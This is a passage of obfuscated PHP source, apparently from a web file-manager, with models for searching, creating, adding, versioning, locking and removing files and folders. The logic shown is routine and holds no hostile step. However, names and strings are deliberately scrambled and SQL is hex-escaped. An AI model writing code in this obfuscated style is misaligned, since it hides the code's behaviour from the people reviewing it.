$—ıı§ı¨ = $this->field($¨¬‰ƒ’–[411])->where($Á×ÂÍÈÉ)->select(); $Ç¢¼–Ö¼ = array_to_keyvalue($—ıı§ı¨, $¨¬‰ƒ’–[12], $¨¬‰ƒ’–[411]); return $Ç¢¼–Ö¼; } private function _listSearchChildrenNear($˜¼˜äÄƒ, $Éš¾ø¦) { $©ÂÙæ¨ =& $_SERVER[ïëó©ÒÚ]; $•àíçËà = array(); $¦ø«Ê— = array($©ÂÙæ¨[441] => $˜¼˜äÄƒ); $•©¸ÒºÄ = $this->field($©ÂÙæ¨[2092])->where($¦ø«Ê—)->select(); $¾Àºî£ = array_to_keyvalue(array_filter_by_field($•©¸ÒºÄ, $©ÂÙæ¨[419], $©ÂÙæ¨[88]), $©ÂÙæ¨[12], $©ÂÙæ¨[411]); $•àíçËà = array_merge($•àíçËà, array_to_keyvalue($•©¸ÒºÄ, $©ÂÙæ¨[12], $©ÂÙæ¨[411])); if (!$¾Àºî£) { return $•àíçËà; } $¦ø«Ê— = array($©ÂÙæ¨[441] => array($©ÂÙæ¨[7], $¾Àºî£)); $•©¸ÒºÄ = $this->field($©ÂÙæ¨[2092])->where($¦ø«Ê—)->limit($Éš¾ø¦)->select(); $•àíçËà = array_merge($•àíçËà, array_to_keyvalue($•©¸ÒºÄ, $©ÂÙæ¨[12], $©ÂÙæ¨[411])); $•àíçËà = array_slice($•àíçËà, 0, $Éš¾ø¦); return $•àíçËà; } private function _listSearchBindPinyin($­ßë¶§¶, &$üÇï·û³, &$ÜõşŒË¸) { $í±ï“¥¼ =& $_SERVER[ïëó©ÒÚ]; if (!isset($­ßë¶§¶[$í±ï“¥¼[1927]]) || !$­ßë¶§¶[$í±ï“¥¼[1927]]) { return; } if (!Input::check($­ßë¶§¶[$í±ï“¥¼[1927]], $í±ï“¥¼[318]) || strlen($­ßë¶§¶[$í±ï“¥¼[1927]]) < 2) { return; } $İƒòæüª = "\x4c\x45\x46\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\151\157\x5f\x73\x6f\165\x72\x63\145\137\x6d\x65\x74\x61\x20\x6d\145\164\x61\x20\x6f\x6e\40\163\x6f\165\162\143\145\x2e\163\157\x75\162\143\x65\111\x44\40\75\40\x6d\145\x74\141\56\x73\x6f\165\162\x63\x65\111\104"; $·Â±ÖûÄ = array(); $ÜõşŒË¸ = str_replace(array($í±ï“¥¼[231], $í±ï“¥¼[53], $í±ï“¥¼[2093]), $í±ï“¥¼[12], $ÜõşŒË¸); $ÜõşŒË¸ = $í±ï“¥¼[447] . str_replace($í±ï“¥¼[50], $í±ï“¥¼[448], $ÜõşŒË¸); $’Õ®ñ¨ê = $üÇï·û³[$í±ï“¥¼[32]]; unset($üÇï·û³[$í±ï“¥¼[32]]); foreach ($üÇï·û³ as $ñ ¼ÔÎş => $´òè¬ä´) { $·Â±ÖûÄ[$í±ï“¥¼[447] . $ñ ¼ÔÎş] = $´òè¬ä´; } foreach ($’Õ®ñ¨ê as $†ÑıÜÓñ) { $·Â±ÖûÄ[] = array($í±ï“¥¼[452] => $†ÑıÜÓñ, $í±ï“¥¼[1003] => $í±ï“¥¼[1931], array($í±ï“¥¼[2094] => $†ÑıÜÓñ, $í±ï“¥¼[2095] => array($í±ï“¥¼[7], array($í±ï“¥¼[474], $í±ï“¥¼[473])))); } $this->join($İƒòæüª); $üÇï·û³ = $·Â±ÖûÄ; } private function _parseSearchWhere($©öò¹Ê) { $”‚²÷á =& $_SERVER[ïëó©ÒÚ]; $åñ¸Û§Û = array(); if (isset($©öò¹Ê[$”‚²÷á[771]]) && $©öò¹Ê[$”‚²÷á[771]]) { $åñ¸Û§Û[$”‚²÷á[85]] = array($”‚²÷á[2096], $©öò¹Ê[$”‚²÷á[771]]); } if (isset($©öò¹Ê[$”‚²÷á[506]]) && $©öò¹Ê[$”‚²÷á[506]]) { $ñÉÜêªÀ = array($”‚²÷á[2097], $©öò¹Ê[$”‚²÷á[506]]); if ($åñ¸Û§Û[$”‚²÷á[85]]) { $åñ¸Û§Û[$”‚²÷á[85]] = array($åñ¸Û§Û[$”‚²÷á[85]], $ñÉÜêªÀ, $”‚²÷á[2098]); } else { $åñ¸Û§Û[$”‚²÷á[85]] = $ñÉÜêªÀ; } } if (isset($©öò¹Ê[$”‚²÷á[2090]]) && $©öò¹Ê[$”‚²÷á[2090]] > 0) { $åñ¸Û§Û[$”‚²÷á[76]] = array($”‚²÷á[2096], $©öò¹Ê[$”‚²÷á[2090]]); } if (isset($©öò¹Ê[$”‚²÷á[2091]]) && $©öò¹Ê[$”‚²÷á[2091]]) { $ñÉÜêªÀ = array($”‚²÷á[2097], $©öò¹Ê[$”‚²÷á[2091]]); if ($åñ¸Û§Û[$”‚²÷á[76]]) { $åñ¸Û§Û[$”‚²÷á[76]] = array($åñ¸Û§Û[$”‚²÷á[76]], $ñÉÜêªÀ, $”‚²÷á[2098]); } else { $åñ¸Û§Û[$”‚²÷á[76]] = $ñÉÜêªÀ; } } if (isset($©öò¹Ê[$”‚²÷á[609]]) && $©öò¹Ê[$”‚²÷á[609]]) { $åñ¸Û§Û[] = array($”‚²÷á[465] => $©öò¹Ê[$”‚²÷á[609]], $”‚²÷á[463] => $©öò¹Ê[$”‚²÷á[609]], $”‚²÷á[1003] => $”‚²÷á[1931]); } if (isset($©öò¹Ê[$”‚²÷á[421]]) && $©öò¹Ê[$”‚²÷á[421]]) { $Áû’…’ = $©öò¹Ê[$”‚²÷á[421]]; if ($Áû’…’ == $”‚²÷á[75]) { $åñ¸Û§Û[$”‚²÷á[419]] = 1; } else { if ($Áû’…’ == $”‚²÷á[2099]) { $åñ¸Û§Û[$”‚²÷á[419]] = 0; } else { if ($Áû’…’) { $Áû’…’ = is_array($Áû’…’) ? $Áû’…’ : explode($”‚²÷á[50], $Áû’…’); $åñ¸Û§Û[$”‚²÷á[421]] = array($”‚²÷á[427], $Áû’…’); $åñ¸Û§Û[$”‚²÷á[419]] = 0; } } } } $this->_parseSearchParent($©öò¹Ê, $åñ¸Û§Û); if (isset($©öò¹Ê[$”‚²÷á[1927]]) && trim($©öò¹Ê[$”‚²÷á[1927]])) { $àÌã§æ = trim($©öò¹Ê[$”‚²÷á[1927]]); $ìßÁƒËø = explode($”‚²÷á[53], $àÌã§æ); if (strlen($àÌã§æ) > 2 && (substr($àÌã§æ, 0, 1) == $”‚²÷á[118] && substr($àÌã§æ, -1) == $”‚²÷á[118]) || substr($àÌã§æ, 0, 1) == $”‚²÷á[58] && substr($àÌã§æ, -1) == $”‚²÷á[58]) { $àÌã§æ = substr($àÌã§æ, 1, -1); $ìßÁƒËø = array($àÌã§æ); } $åñ¸Û§Û[$”‚²÷á[32]] = array(array($”‚²÷á[559], $”‚²÷á[1929] . $àÌã§æ . $”‚²÷á[1929])); if (count($ìßÁƒËø) > 1) { $åñ¸Û§Û[$”‚²÷á[32]] = array(); foreach ($ìßÁƒËø as $°óúú¾) { if (!trim($°óúú¾)) { continue; } $åñ¸Û§Û[$”‚²÷á[32]][] = array($”‚²÷á[559], $”‚²÷á[1929] . trim($°óúú¾) . $”‚²÷á[1929]); } } } return $åñ¸Û§Û; } private function _parseSearchParent($ ƒŞ…òú, &$¨Ç÷³»û) { $ĞÔş”İ÷ =& $_SERVER[ïëó©ÒÚ]; if (!isset($ ƒŞ…òú[$ĞÔş”İ÷[441]]) || !$ ƒŞ…òú[$ĞÔş”İ÷[441]]) { return; } $óˆ©½ = $this->pathInfo($ ƒŞ…òú[$ĞÔş”İ÷[441]]); $Æ¬úğ§ = $óˆ©½[$ĞÔş”İ÷[441]] . $ĞÔş”İ÷[12] === $ĞÔş”İ÷[197]; $Œ‚®…‘ù = $óˆ©½[$ĞÔş”İ÷[420]] == $ĞÔş”İ÷[524]; if ($óˆ©½[$ĞÔş”İ÷[541]] == $ĞÔş”İ÷[542]) { $§ÔÓã = $this->sourceInfo($ ƒŞ…òú[$ĞÔş”İ÷[441]]); $óˆ©½[$ĞÔş”İ÷[530]] = $§ÔÓã[$ĞÔş”İ÷[530]]; } $¨Ç÷³»û[$ĞÔş”İ÷[599]] = array($ĞÔş”İ÷[559], $óˆ©½[$ĞÔş”İ÷[530]] . $ ƒŞ…òú[$ĞÔş”İ÷[441]] . $ĞÔş”İ÷[560]); $õµ®¦°“ = isset($ ƒŞ…òú[$ĞÔş”İ÷[1792]]) && in_array($ĞÔş”İ÷[524], $ ƒŞ…òú[$ĞÔş”İ÷[1792]]); if (!$õµ®¦°“ || !$Œ‚®…‘ù || !$Æ¬úğ§ || !$óˆ©½[$ĞÔş”İ÷[422]]) { return; } if (!AuthModel::authCheckRoot($óˆ©½[$ĞÔş”İ÷[422]][$ĞÔş”İ÷[423]])) { return; } $ÙÉö‹ûê = $óˆ©½[$ĞÔş”İ÷[514]] . $ĞÔş”İ÷[12]; if ($ÙÉö‹ûê == $ĞÔş”İ÷[88]) { unset($¨Ç÷³»û[$ĞÔş”İ÷[599]]); $¨Ç÷³»û[$ĞÔş”İ÷[420]] = self::TYPE_GROUP; return; } $ˆ¬ÁÚ³Š = Model($ĞÔş”İ÷[531])->groupChildrenAll($ÙÉö‹ûê); $ı³†¾â = count($ˆ¬ÁÚ³Š); if ($ı³†¾â <= 1) { return; } $—Ù­‡åÉ = array($ĞÔş”İ÷[441] => 0, $ĞÔş”İ÷[420] => self::TYPE_GROUP, $ĞÔş”İ÷[514] => array($ĞÔş”İ÷[7], $ˆ¬ÁÚ³Š)); $µéâê‚ö = $this->field($ĞÔş”İ÷[2100])->where($—Ù­‡åÉ)->limit($ı³†¾â)->select(); $¨Ç÷³»û[$ĞÔş”İ÷[599]] = array(); foreach ($µéâê‚ö as $¿Œ‡«À) { $¨Ç÷³»û[$ĞÔş”İ÷[599]][] = array($ĞÔş”İ÷[559], $ĞÔş”İ÷[540] . $¿Œ‡«À[$ĞÔş”İ÷[411]] . $ĞÔş”İ÷[560]); } $¨Ç÷³»û[$ĞÔş”İ÷[599]][] = $ĞÔş”İ÷[1931]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ö”÷Ç) { $¡âÚ„™’ =& $_SERVER[ïëó©ÒÚ]; $İ‚ãğ = Model($¡âÚ„™’[522])->where(array($¡âÚ„™’[1652] => $Ö”÷Ç))->find(); $ÑŸ¸Õı = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ö”÷Ç, $İ‚ãğ[$¡âÚ„™’[32]]); $this->userDesktopAdd($ÑŸ¸Õı); return $ÑŸ¸Õı; } public function userDesktopAdd($£ü†“ì) { $˜éÀ¸èñ =& $_SERVER[ïëó©ÒÚ]; $¿ª‡ÛºÔ = LNG($˜éÀ¸èñ[2101]); $Ó´ê£ÕÀ = $this->mkdir($£ü†“ì, $¿ª‡ÛºÔ); $this->metaSet($Ó´ê£ÕÀ, $˜éÀ¸èñ[2102], $˜éÀ¸èñ[88]); $this->metaSet($£ü†“ì, $˜éÀ¸èñ[2103], $Ó´ê£ÕÀ); } public function userPathSafeAdd($Î›åê¶) { $Á†á¸“ =& $_SERVER[ïëó©ÒÚ]; $…¶û¥Ê = Model($Á†á¸“[522])->getInfoFull($Î›åê¶); if (!$…¶û¥Ê) { return !1; } if (_get($…¶û¥Ê, $Á†á¸“[545])) { return $…¶û¥Ê[$Á†á¸“[475]][$Á†á¸“[2104]]; } $™‹Î›ÒÎ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Î›åê¶, $Á†á¸“[2105], $Á†á¸“[442]); Model($Á†á¸“[522])->metaSet($Î›åê¶, $Á†á¸“[2104], $™‹Î›ÒÎ); $this->metaSet($™‹Î›ÒÎ, $Á†á¸“[2106], $Î›åê¶); return $™‹Î›ÒÎ; } public function groupRootAdd($Îê³Å€) { $®İ¤»– =& $_SERVER[ïëó©ÒÚ]; $‚¹÷¯Šâ = Model($®İ¤»–[531])->where(array($®İ¤»–[1921] => $Îê³Å€))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Îê³Å€, $‚¹÷¯Šâ[$®İ¤»–[32]]); } public function systemRootPathAdd($“äÂ©òĞ) { if ($“äÂ©òĞ != $_SERVER[ïëó©ÒÚ][553]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $“äÂ©òĞ); } public function userRootRemove($Š–œÙ´) { $³á¯ì•å = $this->sourceRoot(SourceModel::TYPE_USER, $Š–œÙ´, !0); foreach ($³á¯ì•å as $Ÿé›ƒ”ú) { if (!$Ÿé›ƒ”ú) { continue; } $this->remove($Ÿé›ƒ”ú[$_SERVER[ïëó©ÒÚ][411]], !1); } } public function groupRootRemove($ –ÅÙÖ) { $€¡òí¢í = $this->sourceRoot(SourceModel::TYPE_GROUP, $ –ÅÙÖ); if (!$€¡òí¢í) { return; } $this->remove($€¡òí¢í[$_SERVER[ïëó©ÒÚ][411]], !1); } private function _mkdirRoot($Æù‹®ùä, $Âæãä°–, $ÚÛ¹ÅÓ¿, $öÕÕ³ö = '') { $Ò‹¾œ =& $_SERVER[ïëó©ÒÚ]; $´©Ê—èŒ = array($Ò‹¾œ[410] => 0, $Ò‹¾œ[595] => $Æù‹®ùä, $Ò‹¾œ[596] => $Âæãä°–, $Ò‹¾œ[592] => 1, $Ò‹¾œ[597] => USER_ID, $Ò‹¾œ[598] => USER_ID, $Ò‹¾œ[593] => $öÕÕ³ö, $Ò‹¾œ[599] => $Ò‹¾œ[540], $Ò‹¾œ[439] => 0, $Ò‹¾œ[594] => 0, $Ò‹¾œ[478] => 0, $Ò‹¾œ[600] => $Ò‹¾œ[12]); if ($± ¾§½ = $this->where($´©Ê—èŒ)->find()) { return $± ¾§½[$Ò‹¾œ[411]]; } $ĞÈæµä× = "\x4d\x6f\x64\145\154\x53\x6f\x75\162\143\145\x2e\x6d\153\x64\151\162\x52\x6f\157\x74\56{$Æù‹®ùä}\x2e{$Âæãä°–}\56" . $ÚÛ¹ÅÓ¿; CacheLock::lock($ĞÈæµä×); $´©Ê—èŒ[$Ò‹¾œ[32]] = $ÚÛ¹ÅÓ¿; $óõÍÑƒû = $this->add($´©Ê—èŒ); $·‚¡´¦Ó = array($Ò‹¾œ[601] => short_id($óõÍÑƒû)); $this->where(array($Ò‹¾œ[426] => $óõÍÑƒû))->save($·‚¡´¦Ó); CacheLock::unlock($ĞÈæµä×); return $óõÍÑƒû; } private function sourceRoot($ßöâ™ÜÍ, $ ÆÅ’â¹, $»Ü€¢†Á = false) { $‚ıÒÖö™ =& $_SERVER[ïëó©ÒÚ]; $ôÛáÏÚî = array($‚ıÒÖö™[410] => 0, $‚ıÒÖö™[595] => $ßöâ™ÜÍ, $‚ıÒÖö™[596] => $ ÆÅ’â¹); if ($»Ü€¢†Á) { $é ­¯¼š = $this->where($ôÛáÏÚî)->select(); return $é ­¯¼š ? $é ­¯¼š : array(); } $ÎÔÈò½ = $this->where($ôÛáÏÚî)->find(); return $ÎÔÈò½ ? $ÎÔÈò½ : array(); } public function sourceRootGroup($ƒ¤±çÌÂ) { $ŞÀ¬àª =& $_SERVER[ïëó©ÒÚ]; if (is_string($ƒ¤±çÌÂ)) { $ƒ¤±çÌÂ = array($ƒ¤±çÌÂ); } $ÉÙ÷¬Éê = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ƒ¤±çÌÂ, $ŞÀ¬àª[188]); $±‹ãÏ¸Ê = array($ŞÀ¬àª[369] => $ÉÙ÷¬Éê, $ŞÀ¬àª[366] => array($ŞÀ¬àª[769] => count($ƒ¤±çÌÂ))); $this->_listDataApply($±‹ãÏ¸Ê[$ŞÀ¬àª[369]]); $this->_listMake($±‹ãÏ¸Ê); return array_to_keyvalue($±‹ãÏ¸Ê[$ŞÀ¬àª[82]], $ŞÀ¬àª[514]); } public function mkfile($ó×”õ±ˆ, $³ìóê·®, $ÕéÏ„å = '', $ù³ŞÔÆ¿ = REPEAT_RENAME) { $Ó¤ÅÛ¡ß =& $_SERVER[ïëó©ÒÚ]; $—…°Í™À = Model($Ó¤ÅÛ¡ß[618])->addFileByContent($ÕéÏ„å, $³ìóê·®); return $this->_createFileCall($ó×”õ±ˆ, $³ìóê·®, $—…°Í™À, $ù³ŞÔÆ¿, $Ó¤ÅÛ¡ß[1341]); } public function addFile($Ü‡˜Ü‡Î, $»±áè²œ, $ğ¯ÓÀ£ş, $Ğ×èÀÛ = false, $–”Îıâ„ = REPEAT_RENAME) { $¦ÉËó÷ü = Model($_SERVER[ïëó©ÒÚ][618])->addFile($»±áè²œ, $ğ¯ÓÀ£ş, $Ğ×èÀÛ); return $this->_createFileCall($Ü‡˜Ü‡Î, $ğ¯ÓÀ£ş, $¦ÉËó÷ü, $–”Îıâ„); } public function addFileByFileID($ñµòİ, $ï’ëˆˆ , $ÎÑ’Øö, $‚øúÖä¬ = REPEAT_RENAME) { $ó›‰ˆÇá =& $_SERVER[ïëó©ÒÚ]; $±²µ´È¯ = Model($ó›‰ˆÇá[618])->find($ï’ëˆˆ ); Model($ó›‰ˆÇá[618])->linkAdd($ï’ëˆˆ ); return $this->_createFileCall($ñµòİ, $ÎÑ’Øö, $±²µ´È¯, $‚øúÖä¬); } public function addFileByRemote($ ›„Ä¤¨, $ùÎ‰úş·, $Å±¿ôö, $¦êùı›” = array(), $×¤éİ–ò = REPEAT_RENAME) { $áäõ·İ = Model($_SERVER[ïëó©ÒÚ][618])->addFileByRemote($ùÎ‰úş·, $Å±¿ôö, $¦êùı›”); return $this->_createFileCall($ ›„Ä¤¨, $Å±¿ôö, $áäõ·İ, $×¤éİ–ò); } private function _createFileCall($¸ô—±½½, $³ÎØ¢­×, $íó‘Ş±À, $¢õœ„Šê, $åŠËË“ = "\165\x70\154\157\141\x64") { $Áì‚ä® =& $_SERVER[ïëó©ÒÚ]; $—Úú¥… = !1; $this->setMasterDB(); $this->lockWriteStart($¸ô—±½½, $³ÎØ¢­×); $­Û¡Ò¶İ = $this->fileNameExist($¸ô—±½½, $³ÎØ¢­×); $Ñ‹úÅ‘š = $this->_createFile($¸ô—±½½, $³ÎØ¢­×, $íó‘Ş±À, $¢õœ„Šê, $—Úú¥…); if (!$—Úú¥…) { Model($Áì‚ä®[480])->remove($íó‘Ş±À[$Áì‚ä®[477]]); } if ($—Úú¥… && $Ñ‹úÅ‘š && $Ñ‹úÅ‘š != $­Û¡Ò¶İ) { Model($Áì‚ä®[2074])->eventCreate($Ñ‹úÅ‘š, $åŠËË“); } $this->lockWriteEnd($¸ô—±½½, $³ÎØ¢­×); return $Ñ‹úÅ‘š; } public function mkdir($Ñ½õÏå, $ğÄŞ´¶•, $İ¬•’ÚÜ = REPEAT_SKIP) { $Èö™éó =& $_SERVER[ïëó©ÒÚ]; $this->setMasterDB(); $¢¸¤ÏÖ = $this->sourceInfo($Ñ½õÏå); if (!$¢¸¤ÏÖ) { return !1; } $this->lockWriteStart($Ñ½õÏå, $ğÄŞ´¶•); if ($İ¬•’ÚÜ !== !1) { $áÒ›¯í‰ = $this->fileNameExist($Ñ½õÏå, $ğÄŞ´¶•); if ($áÒ›¯í‰ && $İ¬•’ÚÜ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ñ½õÏå, $ğÄŞ´¶•); return $áÒ›¯í‰; } $ğÄŞ´¶• = $this->fileNameAuto($Ñ½õÏå, $ğÄŞ´¶•, $İ¬•’ÚÜ); } $‡ê„éŸ = array($Èö™éó[592] => 1, $Èö™éó[429] => $ğÄŞ´¶•, $Èö™éó[593] => $Èö™éó[12], $Èö™éó[478] => 0, $Èö™éó[594] => 0); $ûƒÒ© í = $this->_addSource($‡ê„éŸ, $¢¸¤ÏÖ); Model($Èö™éó[2074])->eventCreate($ûƒÒ© í, $Èö™éó[1342]); $this->lockWriteEnd($Ñ½õÏå, $ğÄŞ´¶•); return $ûƒÒ© í; } public function listSourceRoot($¤ÈÑÊ‚—, $ç©Šë‡Ñ, $€½§Ÿ¥ = "\163\157\165\x72\x63\145\x49\x44\x2c\164\141\x72\147\x65\164\x49\104\54\163\x69\172\x65") { $£ôÄç°’ =& $_SERVER[ïëó©ÒÚ]; $ºÙëÅ÷‡ = $£ôÄç°’[378]; $†ÎµœàÀ = array(); $íô¡õ = 1024 * 50; $÷ŞÄÃ…À = is_array($÷ŞÄÃ…À) ? $÷ŞÄÃ…À : array(); $†§Ç³ª = count($ç©Šë‡Ñ); $•ÅÊ×ÒÄ = $this->tablePrefix . $£ôÄç°’[2107]; for ($Ï†èñ½ = 0; $Ï†èñ½ < $†§Ç³ª; $Ï†èñ½++) { $¢ÍŠÈÈ„ = $ç©Šë‡Ñ[$Ï†èñ½]; $ºÙëÅ÷‡ .= "\x53\x45\114\x45\x43\x54\x20\x2a\x20\106\122\x4f\115\x20\50\x53\x45\x4c\105\x43\124\x20{$€½§Ÿ¥}\x20\106\122\x4f\x4d\x20\140{$•ÅÊ×ÒÄ}\x60\40\x57\110\105\x52\x45\x20"; $ºÙëÅ÷‡ .= "\140\x70\x61\162\145\156\x74\x49\x44\x60\x3d\x30\40\x41\116\x44\40\x60\x74\x61\162\147\145\164\x49\x44\x60\x3d{$¢ÍŠÈÈ„}\40\101\116\x44\x20\140\x74\141\162\x67\145\164\x54\x79\160\x65\140\75{$¤ÈÑÊ‚—}\x20\x6c\x69\x6d\x69\164\x20\61\x29\x20\x61\x73\x20\164\x62\137{$Ï†èñ½}\40\x55\116\x49\x4f\116\x20\101\x4c\114\x20"; if ((strlen($ºÙëÅ÷‡) >= $íô¡õ || $Ï†èñ½ == $†§Ç³ª - 1) && $ºÙëÅ÷‡) { $ºÙëÅ÷‡ = substr($ºÙëÅ÷‡, 0, -strlen($£ôÄç°’[1041])); $±ÑîÈ¡ = $this->query($ºÙëÅ÷‡); $ºÙëÅ÷‡ = $£ôÄç°’[12]; $†ÎµœàÀ = array_merge($†ÎµœàÀ, $±ÑîÈ¡); } } return $†ÎµœàÀ; } private function _createFile($Õ¡šæÚÄ, $ŒØ«È‘ø, $§£Òéó, $…­Ì„Š‹, &$íùäü) { $ãÔ‚£ÇÎ =& $_SERVER[ïëó©ÒÚ]; $¨é¶Ë´ = $this->sourceInfo($Õ¡šæÚÄ); if (!$§£Òéó || !$¨é¶Ë´) { return !1; } if ($…­Ì„Š‹ !== !1) { $µ‹·äÇ = $this->fileNameExist($Õ¡šæÚÄ, $ŒØ«È‘ø); } $íùäü = !0; if ($…­Ì„Š‹ && $µ‹·äÇ) { if ($…­Ì„Š‹ == REPEAT_SKIP) { $íùäü = !1; return $µ‹·äÇ; } else { if ($…­Ì„Š‹ == REPEAT_REPLACE) { $­œèî¼“ = $this->sourceInfo($µ‹·äÇ); $ùòÛ“÷ = $this->fileHistory($­œèî¼“, $§£Òéó[$ãÔ‚£ÇÎ[477]], $§£Òéó[$ãÔ‚£ÇÎ[76]]); if (!$ùòÛ“÷) { $íùäü = !1; } else { $this->folderSizeReset($Õ¡šæÚÄ); } return $µ‹·äÇ; } else { $ŒØ«È‘ø = $this->fileNameAuto($Õ¡šæÚÄ, $ŒØ«È‘ø, $…­Ì„Š‹, !1); } } } $×ë¼İÄš = array($ãÔ‚£ÇÎ[592] => 0, $ãÔ‚£ÇÎ[429] => $ŒØ«È‘ø, $ãÔ‚£ÇÎ[593] => substr(get_path_ext($ŒØ«È‘ø), 0, 10), $ãÔ‚£ÇÎ[478] => $§£Òéó[$ãÔ‚£ÇÎ[477]], $ãÔ‚£ÇÎ[594] => $§£Òéó[$ãÔ‚£ÇÎ[76]]); $¸™ıĞÑ× = $this->_addSource($×ë¼İÄš, $¨é¶Ë´); $this->folderSizeReset($Õ¡šæÚÄ, intval($×ë¼İÄš[$ãÔ‚£ÇÎ[76]])); return $¸™ıĞÑ×; } protected function fileHistory($¤»ßúğİ, $šÈØ­™, $‹õâ¾÷) { $éŞÂ÷ê =& $_SERVER[ïëó©ÒÚ]; $æ’êˆÇÏ = defined($éŞÂ÷ê[484]) ? USER_ID : $éŞÂ÷ê[197]; if ($¤»ßúğİ[$éŞÂ÷ê[477]] == $šÈØ­™) { return !1; } $this->checkLock($¤»ßúğİ[$éŞÂ÷ê[411]], $šÈØ­™); Model($éŞÂ÷ê[2108])->addHistory($¤»ßúğİ); $âÙè¼ê¾ = array($éŞÂ÷ê[598] => $æ’êˆÇÏ, $éŞÂ÷ê[433] => time(), $éŞÂ÷ê[477] => $šÈØ­™, $éŞÂ÷ê[76] => $‹õâ¾÷); $this->where(array($éŞÂ÷ê[426] => $¤»ßúğİ[$éŞÂ÷ê[411]]))->save($âÙè¼ê¾); $this->sourceCacheClear($¤»ßúğİ[$éŞÂ÷ê[411]]); return !0; } public function checkLock($–Ü®›, $Ò‘¡Ù) { $¿ÒËùÈè =& $_SERVER[ïëó©ÒÚ]; $Ä œòøú = $this->pathInfo($–Ü®›); if (!$this->fileIsLock($Ä œòøú, !0)) { return; } $³°ìº… = Session::get($¿ÒËùÈè[2109]); $Ú‘·ûãı = substr($Ä œòøú[$¿ÒËùÈè[32]], 0, -1 - strlen($Ä œòøú[$¿ÒËùÈè[174]])) . $¿ÒËùÈè[1609] . $³°ìº… . $¿ÒËùÈè[10] . $Ä œòøú[$¿ÒËùÈè[174]]; $¯„·Êºæ = Model($¿ÒËùÈè[618])->find($Ò‘¡Ù); $this->_createFileCall($Ä œòøú[$¿ÒËùÈè[441]], $Ú‘·ûãı, $¯„·Êºæ, REPEAT_REPLACE, $¿ÒËùÈè[1341]); $¿óƒÖ¯ä = $Ä œòøú[$¿ÒËùÈè[475]][$¿ÒËùÈè[557]]; $İÅ†ŸÖ = $¿óƒÖ¯ä[$¿ÒËùÈè[551]] ? $¿óƒÖ¯ä[$¿ÒËùÈè[551]] : $¿óƒÖ¯ä[$¿ÒËùÈè[32]]; show_json(LNG($¿ÒËùÈè[2110]) . $¿ÒËùÈè[2111] . LNG($¿ÒËùÈè[2112]) . $¿ÒËùÈè[2113] . $İÅ†ŸÖ . $¿ÒËùÈè[2114], !1); } public function fileIsLock($Ò¸ìı¯‚, $øÃã¢—Ø = false) { $Ï—èÉçó =& $_SERVER[ïëó©ÒÚ]; if (!isset($Ò¸ìı¯‚[$Ï—èÉçó[475]]) || !$Ò¸ìı¯‚[$Ï—èÉçó[475]][$Ï—èÉçó[554]]) { return !1; } if ($Ò¸ìı¯‚[$Ï—èÉçó[475]][$Ï—èÉçó[554]] != USER_ID) { return !0; } $×Ş“–€è = $GLOBALS[$Ï—èÉçó[6]][$Ï—èÉçó[89]][$Ï—èÉçó[555]]; if ($Ò¸ìı¯‚[$Ï—èÉçó[475]][$Ï—èÉçó[556]] <= time() - $×Ş“–€è) { $this->metaSet($Ò¸ìı¯‚[$Ï—èÉçó[411]], $Ï—èÉçó[554], null); $this->metaSet($Ò¸ìı¯‚[$Ï—èÉçó[411]], $Ï—èÉçó[556], null); } if ($øÃã¢—Ø) { $this->metaSet($Ò¸ìı¯‚[$Ï—èÉçó[411]], $Ï—èÉçó[556], time()); } return !1; } private function _addSource($ÙÃ­Í²ë, $Õ¯²™—) { $¥°‡ïçö =& $_SERVER[ïëó©ÒÚ]; $»¦ÑèÄ• = defined($¥°‡ïçö[484]) ? USER_ID : $¥°‡ïçö[197]; $£áóÌâı = array($¥°‡ïçö[595] => $Õ¯²™—[$¥°‡ïçö[420]], $¥°‡ïçö[596] => $Õ¯²™—[$¥°‡ïçö[514]], $¥°‡ïçö[597] => $»¦ÑèÄ•, $¥°‡ïçö[598] => $»¦ÑèÄ•, $¥°‡ïçö[410] => $Õ¯²™—[$¥°‡ïçö[411]], $¥°‡ïçö[599] => $Õ¯²™—[$¥°‡ïçö[530]] . $Õ¯²™—[$¥°‡ïçö[411]] . $¥°‡ïçö[50], $¥°‡ïçö[439] => 0, $¥°‡ïçö[600] => $¥°‡ïçö[12]); $ÙÃ­Í²ë = array_merge($£áóÌâı, $ÙÃ­Í²ë); $this->updateModifyTime($ÙÃ­Í²ë[$¥°‡ïçö[441]]); $ê´Ïì¹¸ = $¥°‡ïçö[2115] . $Õ¯²™—[$¥°‡ïçö[411]]; if (isset(self::$cacheChildList[$ê´Ïì¹¸])) { unset(self::$cacheChildList[$ê´Ïì¹¸]); } static $ğ¸øöÕĞ = false; if (!$ğ¸øöÕĞ) { Hook::trigger($¥°‡ïçö[582], $ÙÃ­Í²ë); $ğ¸øöÕĞ = !0; } $ªó™°‚ù = $this->add($ÙÃ­Í²ë); $¯¾¢òİç = array($¥°‡ïçö[601] => short_id($ªó™°‚ù)); $this->where(array($¥°‡ïçö[426] => $ªó™°‚ù))->save($¯¾¢òİç); $this->setNamePinyin($ªó™°‚ù, $ÙÃ­Í²ë[$¥°‡ïçö[32]]); return $ªó™°‚ù; } public function remove($ö—üŸÄ, $Æµ€ñóı = true) { $½ °ÅæÔ =& $_SERVER[ïëó©ÒÚ]; $êÂÛ»•Ö = $this->sourceInfo($ö—üŸÄ); $’¢š¢…ò = intval($êÂÛ»•Ö[$½ °ÅæÔ[420]]) === self::TYPE_SYSTEM; $˜öÌáĞé = Model($½ °ÅæÔ[444])->get($½ °ÅæÔ[2116]) == $½ °ÅæÔ[88]; if ($’¢š¢…ò || $Æµ€ñóı || !$˜öÌáĞé) { return $this->removeNow($ö—üŸÄ, $Æµ€ñóı); } $…ÓšÂà = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $×Æ¦”¢ß = $êÂÛ»•Ö[$½ °ÅæÔ[420]] == self::TYPE_USER ? $½ °ÅæÔ[609] : $½ °ÅæÔ[524]; if ($×Æ¦”¢ß == $½ °ÅæÔ[609]) { $æşö½ŸÏ = Model($½ °ÅæÔ[522])->getInfo($êÂÛ»•Ö[$½ °ÅæÔ[514]]); $ò¨ÒĞëî = !empty($æşö½ŸÏ[$½ 